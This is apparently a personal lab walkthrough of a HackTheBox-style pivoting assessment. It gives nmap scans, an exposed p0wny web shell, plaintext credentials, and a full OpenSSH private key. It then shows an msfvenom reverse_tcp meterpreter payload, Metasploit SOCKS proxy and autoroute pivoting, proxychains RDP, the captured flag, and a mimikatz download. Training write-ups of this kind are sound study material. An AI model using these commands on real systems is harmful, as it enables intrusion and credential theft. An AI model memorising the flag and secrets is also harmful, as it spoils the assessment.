Target IP
```go
10.129.229.129
```

## NMAP COMMAND
```go
nmap -sV -sC -A 10.129.229.129
```

Open ports
```go
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
```

```go
80/tcp open  http    Apache httpd 2.4.41
```

## Investigate NMAP output

NMAP output reveals the http-title to be `p0wny@shell`? 
```go
Nmap scan report for 10.129.229.129
Host is up (0.020s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: p0wny@shell:~#
```

- Found on [GitHub](https://github.com/flozz/p0wny-shell), it's revealed to be a PHP shell.
- Web browser shows available via the browser
- Enumerating the directories, there are two user directories: `administrator` and `webadmin`, though only `webadmin` is available to us

>[!success] Enumerating the directories there is a note in `/home/webadmin/for-admin-eyes-only` stating the credentials needed to access server01 and other servers in the subnet

![[Pasted image 20241229165238.png]]

==Credential discovery #1==
^first-creds
Creds found for `server01` 
username ^325593
```
mlefay
```

password
```
Plain Human work!
```

#### p0wnyshell default creds found in script
![[p0wnyshell_creds.png]]

==Credential Discovery #2==
^second-creds
username
```go
p0wny
```
password
```go
shell
```

#### private_key found
Found the private key and it is readable!
![[Dans Field Manual/5-Lateral Movement/Skill Assessment/screenshots/private_key.png]]

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

## Pivot Host Compromise

- Copy the contents of the private key into `id_rsa`
- SSH into the web server with the private key and the `webadmin` username

SSH into the webserver
```go
ssh -i id_rsa webadmin@10.129.229.129
```

Ping sweep to find other hosts on the network
```go
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

IP of second host found 
```
172.16.5.35
```
![[pivot_host_ips.png]]

This box is the pivot host.
![[Pasted image 20250403220026.png]]

Generate msfvenom payload
```go
bundle exec msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.129.229.129 -f elf -o backupjob LPORT=8080
```

Copy backupjob to webadmin server
```go
scp -i id_rsa backupjob webadmin@10.129.229.129:/tmp
```

Configure the metasploit reverse_tcp payload
```go
use exploit/multi/handler
```

```go
set lhost 0.0.0.0
```

```go
set lport 8080
```

```go
set payload linux/x64/meterpreter/reverse_tcp
```

```go
run
```

Execute the `backupjob` payload on the pivot host, the meterpreter session will be established on the attack host.
![[initial_meterpreter_session.png]]

REMINDER
>[! Important] Second Host IP is 172.16.5.35

Facts:
- There is no route from my attack host to this internal subnet
- The pivot host has access to both the 172.16.5.0/23 range and the the 10.0.0.0/8 range
- I need to establish a proxy on the attack host so that I can reach the 172.16.5.35 machine

### Configure MSF's SOCKS Proxy

>[! tip ] Remember, SOCKS Proxy acts as a local proxy and will establish a route based on the destination 

>[! Warning] Before proceeding, ensure the line `socks4  127.0.0.1 9050` is present in `/etc/proxychains.conf`

Background the current mfs6 sessions with the `bg` command, then execute the following:

```go
use auxiliary/server/socks_proxy
```

```go
set SRVPORT 9050
```

```go
set SRVHOST 0.0.0.0
```

```go
set version 4a
```

```go
run
```

The msf6 socks_proxy module must route all traffic via the meterpreter session. Use the `post/multi/manage/autoroute` module to add routes for `172.16.5.0`

### Adding routes via AutoRoute Metasploit module

```go
use post/multi/manage/autoroute
```

```go
set SESSION 1
```

```go
set SUBNET 172.16.5.0
```

```go
run
```

After executing the run command, you should see output same as the below:
```go
msf6 post(multi/manage/autoroute) > run

[*] Running module against inlanefreight.local
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.0.0/255.255.0.0 from host's routing table.
[*] Post module execution completed
```

If doing from the Meterpreter session...
```go
run autoroute -s 172.16.5.0/23
```

Scanning internal target 172.16.5.35 via proxychains
```go
proxychains nmap 172.16.5.35 -p3389 -sT -v -Pn
```

Output:
```go
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/aarch64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-30 12:55 EST
Initiating Parallel DNS resolution of 1 host. at 12:55
Completed Parallel DNS resolution of 1 host. at 12:55, 0.03s elapsed
Initiating Connect Scan at 12:55
Scanning 172.16.5.35 [1 port]
Completed Connect Scan at 12:56, 2.00s elapsed (1 total ports)
Nmap scan report for 172.16.5.35
Host is up.

PORT     STATE    SERVICE
3389/tcp filtered ms-wbt-server

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.05 seconds
```

This shows port 3389 is filtered. Attempt a remote session to the Windows target via xfreerdp

RDP into Windows target using the creds from [[#^325593 |first creds found]] 
```go
proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:Plain Human work!
```

Flag Acquired
```go
S1ngl3-Piv07-3@sy-Day
```
![[Dans Field Manual/5-Lateral Movement/Skill Assessment/screenshots/flag.png]]


In previous pentests against Inlanefreight, we have seen that they have a bad habit of utilizing accounts with services in a way that exposes the users credentials and the network as a whole. What user is vulnerable?
```go
```

Download mimikatz and extract the project
```go
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
```



